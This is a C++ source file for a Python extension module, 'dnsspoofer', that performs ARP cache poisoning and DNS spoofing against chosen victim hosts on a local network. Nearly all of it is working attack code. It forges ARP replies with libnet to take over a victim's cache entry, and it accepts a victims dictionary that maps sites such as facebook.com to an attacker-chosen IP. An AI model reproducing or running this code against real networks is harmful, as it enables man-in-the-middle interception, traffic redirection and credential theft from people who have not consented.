#include <Python.h>
#include <libnet.h>
#include <stdexcept>
#include <iostream>
#include "dns.hpp"

//realeasing the GIL won't make almost any difference
//because the functions are IO bound not CPU bound
//so I'm doing this just for fun of it
//#define RUN_WITH_ALLOW_THREADS



class LibnetError: public std::runtime_error
{
public:
    LibnetError(const std::string& what_arg):
            std::runtime_error(what_arg){};
    LibnetError( const char* what_arg ):
            std::runtime_error(what_arg){};
};

/**
 * @param vulnerable_host_mac_addr: host that you are going to attack
 * @param ip_cache_entry: IP for which you want to override ARP-cache entry with your MAC addr
 * @param device: (optional) the network interface that you want to use
 */
static void
spoof_arp(const uint8_t* vulnerable_host_mac_addr, char* ip_cache_entry, const char * device){
    libnet_t *ln;
    u_int32_t target_ip_addr, zero_ip_addr;
    const u_int8_t zero_hw_addr[]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr* src_hw_addr;
    char libnet_init_errbuf[LIBNET_ERRBUF_SIZE];
    char host_name[] =  "0.0.0.0";
    if((ln = libnet_init(LIBNET_LINK, device, libnet_init_errbuf))==NULL){
        throw LibnetError(libnet_init_errbuf);
    }
    if((src_hw_addr = libnet_get_hwaddr(ln))==NULL)
        goto cleanup_error;
    if((target_ip_addr = libnet_name2addr4(ln, ip_cache_entry, LIBNET_RESOLVE)) == -1)
        goto cleanup_error;
    if((zero_ip_addr = libnet_name2addr4(ln, host_name, LIBNET_DONT_RESOLVE)) == -1)
        goto cleanup_error;
    if(libnet_autobuild_arp(
            ARPOP_REPLY,                       /* operation type       */
            src_hw_addr->ether_addr_octet,     /* sender hardware addr */
            (const uint8_t*) &target_ip_addr,  /* sender protocol addr */
            (const uint8_t*) zero_hw_addr,    /* target hardware addr */
            (uint8_t*) &zero_ip_addr,          /* target protocol addr */
            ln)==-1)                           /* libnet context       */
        goto cleanup_error;
    if(libnet_autobuild_ethernet(vulnerable_host_mac_addr, ETHERTYPE_ARP, ln) == -1)
        goto cleanup_error;
    if(libnet_write(ln)==1)
        goto cleanup_error;

    libnet_destroy(ln);
    return;

    cleanup_error: ;
        // libnet_destroy is going to destroy the error_buffer, so we need to copy it
        std::string error_buffer=libnet_geterror(ln);
        libnet_destroy(ln);
        throw LibnetError(error_buffer);
}

static PyObject *
dnsspoofer_spoof_arp(PyObject *self, PyObject *args)
{
    PyBytesObject* target_mac_addr;
    PyBytesObject* ip_to_spoof; //TODO allow to either be bytes or str
    const char* device=NULL;
    ssize_t device_len=0;

    if (!PyArg_ParseTuple(args, "SS|z#", &target_mac_addr, &ip_to_spoof, &device, &device_len))
        return NULL;

    const uint8_t * vulnerable_host_mac_addr;
    Py_ssize_t vulnerable_host_mac_addr_size;
    if (PyBytes_AsStringAndSize((PyObject *) target_mac_addr, (char**)&vulnerable_host_mac_addr, &vulnerable_host_mac_addr_size)==-1)
        return NULL;
    if (vulnerable_host_mac_addr_size!=6){
        PyErr_SetString(PyExc_ValueError, "The mac address should have precisely 6 bytes!");
        return NULL;
    }

    char* ip_cache_entry;
    if(!(ip_cache_entry=PyBytes_AsString((PyObject*) ip_to_spoof)))
        return NULL;


#ifdef RUN_WITH_ALLOW_THREADS
    Py_BEGIN_ALLOW_THREADS
#endif
    try {
        spoof_arp(vulnerable_host_mac_addr, ip_cache_entry, device);
    }
    catch (const LibnetError& err){
#ifdef RUN_WITH_ALLOW_THREADS
        Py_BLOCK_THREADS;
#endif
        PyErr_SetString(PyExc_RuntimeError, err.what());
        return NULL;
    }
    catch(std::bad_alloc){
#ifdef RUN_WITH_ALLOW_THREADS
        Py_BLOCK_THREADS;
#endif
        return PyErr_NoMemory();
    }


#ifdef RUN_WITH_ALLOW_THREADS
    Py_END_ALLOW_THREADS
#endif


    Py_RETURN_NONE;
}




static PyObject *
dnsspoofer_spoof_dns(PyObject *self, PyObject *args)
{
    const char* interface;
    PyObject * victims_dict;
    if (!PyArg_ParseTuple(args, "sO", &interface, &victims_dict))
        return NULL;
    if (!PyDict_Check(victims_dict)){
        PyErr_SetString(PyExc_RuntimeError, "passed victim argument is not a dictionary");
        return NULL;
    }
    PyObject *key, *value;
    Py_ssize_t victim_no = 0;
    std::vector<DNSVictim> victims;


    // TODO not descriptive error messages when sb screws up with passing the arguments:
    // example: TypeError: bad argument type for built-in operation
    // when I used {"www.wp.pl": 1234}
    while (PyDict_Next(victims_dict, &victim_no, &key, &value)) {
        auto victim = DNSVictim();
        const char* victim_ip;
        Py_ssize_t victim_ip_length;
        if((victim_ip=PyUnicode_AsUTF8AndSize(key, &victim_ip_length))==NULL)
            return NULL;
        victim.ip=victim_ip;
        const char* ip_to_spoof;
        PyObject* sites_dict;
        if (!PyArg_ParseTuple(value, "sO", &ip_to_spoof, &sites_dict)) {
            return NULL;
        }
        victim.spoofed_source_ip=ip_to_spoof;
        if (!PyDict_Check(sites_dict)){
            PyErr_SetString(PyExc_RuntimeError, "passed sites object is not a dictionary");
            return NULL;
        }
        PyObject *site_url_obj, *site_ip_obj;
        Py_ssize_t site_number = 0;
        std::map<std::string,std::string> sites;
        while (PyDict_Next(sites_dict, &site_number, &site_url_obj, &site_ip_obj)) {
            const char* site_url;
            Py_ssize_t site_url_length;
            const char* site_ip;
            Py_ssize_t site_ip_length;
            if((site_url=PyUnicode_AsUTF8AndSize(site_url_obj, &site_url_length))==NULL)
                return NULL;
            if((site_ip=PyUnicode_AsUTF8AndSize(site_ip_obj, &site_ip_length))==NULL)
                return NULL;
            sites[std::string(site_url)]=std::string(site_ip);
        }
        victim.sites=sites;
        victims.push_back(victim);
    }
//    for(auto victim: victims){
//        std::cout<<victim.ip<< " "<<victim.spoofed_source_ip<<std::endl;
//        for(auto s: victim.sites){
//            std::cout<<s.first<<" " <<s.second<<std::endl;
//        }
//    }

    try {
        run_dns_spoof(std::string(interface), &victims);
    }
    catch (const PcapError& err){
        PyErr_SetString(PyExc_RuntimeError, err.what());
        return NULL;
    }

    Py_RETURN_NONE;
}

static PyObject *
dnsspoofer_stop_dns_spoofing(PyObject *self, PyObject *args)
{
    stop_dns_spoofing();
    Py_RETURN_NONE;
}


static PyMethodDef DnsSpooferMethods[] = {
    {"spoof_arp",  dnsspoofer_spoof_arp, METH_VARARGS,
            PyDoc_STR("spoof_arp(vulnerable_host_mac_addr: bytes, ip_cache_entry: bytes, device: Union[str,bytes] = None) -> None \n\n"
                      "Spoof arp cache of a victim.\n"
                      "Releases the GIL while doing the actual spoofing.\n"
                      "@param vulnerable_host_mac_addr - victim's mac addr\n"
                      "@param ip_cache_entry - ip address to override cache entry with your own mac address\n"
                      "@param device - network interface. If device is set to None, libnet will try to choose a suitable interface.")},
    {"spoof_dns", dnsspoofer_spoof_dns, METH_VARARGS,
            PyDoc_STR("spoof_dns(interface: str, victims: Dict[str,List[str,Dict[str,str]]]) -> None \n\n"
                      "Spoof dns.\n"
                      "@param victims - example :\n"
                      "victims = {\n"
                      "    \"192.168.1.100\":(\n"
                      "        \"192.168.1.1\",\n"
                      "        {\n"
                      "            \"facebook.com\": \"51.254.121.149\",\n"
                      "            \"wp.pl\": \"51.254.121.149\",\n"
                      "        }\n"
                      "    )\n"
                      "}")
    },
    {"stop_dns_spoofing", dnsspoofer_stop_dns_spoofing, METH_VARARGS,
            PyDoc_STR("spoof_dns() -> None \n\n"
                      "Stop spoofing DNS. Tries to stop all calls to spoof_dns.\n"
                      "This function is registered as SIGINT and SIGTERM handler in this module.\n")
    },
    {NULL, NULL, 0, NULL}
};


static struct PyModuleDef dnsspoofer_module = {
   PyModuleDef_HEAD_INIT,
   "dnsspoofer",
   PyDoc_STR("Module for ARP and DNS spoofing."),
   -1,
   DnsSpooferMethods
};

PyMODINIT_FUNC
PyInit_dnsspoofer(void)
{
    PyObject *m;

    m = PyModule_Create(&dnsspoofer_module);
    if (m == NULL)
        return NULL;

    return m;
}
